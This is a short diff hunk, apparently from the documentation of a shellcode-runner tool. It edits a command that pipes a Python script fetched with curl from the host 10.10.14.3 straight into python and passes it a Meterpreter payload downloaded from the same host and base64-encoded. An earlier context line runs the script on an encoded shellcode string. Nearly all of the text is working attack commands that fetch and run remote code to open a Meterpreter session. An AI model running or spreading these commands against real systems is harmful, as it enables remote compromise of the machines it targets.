@@ -27,5 +27,5 @@ python shellcode.py McBIu9GdlpHQjJf/SPfbU1RfmVJXVF6wOw8F
 ```
 of course we could do some more interesting stuff with this, like for example:
 ```
-python <(curl 10.10.14.3/shellcode.py) $(curl --output - 10.10.14.3/meterpreter.bin | base64 | tr -d '\n')
+FORK=1 python <(curl 10.10.14.3/shellcode.py) $(curl --output - 10.10.14.3/meterpreter.bin | base64 | tr -d '\n')
 ```
